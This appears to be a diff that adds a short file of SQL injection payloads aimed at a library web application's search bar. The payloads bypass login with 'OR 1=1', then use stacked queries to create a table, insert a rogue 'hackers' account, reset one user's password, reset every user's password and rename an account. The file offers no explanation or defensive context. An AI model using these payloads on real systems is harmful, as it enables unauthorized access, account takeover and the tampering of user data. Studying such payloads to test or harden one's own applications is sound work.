@@ -1,0 +1,8 @@
+' or 1=1;-- 
+' OR '1'='1'; CREATE TABLE CUSTOMERS( ID INT NOT NULL, NAME VARCHAR (20) NOT NULL, AGE INT NOT NULL, ADDRESS CHAR (25) , SALARY DECIMAL (18, 2), PRIMARY KEY (ID) );--
+' OR '1'='1
+Only Works in library search bar:
+' OR '1'='1'; INSERT INTO users(userName, password, firstName, lastName, memberID, phoneNumber, emailAddress, ISBN) values ('hackers','hacked','hacker-san','hacked','12345678','9996669999','hacker@gmail.com','190721');--
+' OR '1'='1'; UPDATE users SET password = 'hacked3' WHERE userName = 'bravo360';--
+' OR '1'='1'; UPDATE users SET password = 'hacked3';--
+' OR '1'='1'; UPDATE users SET userName = 'hacker' WHERE password = 'hacked4';--
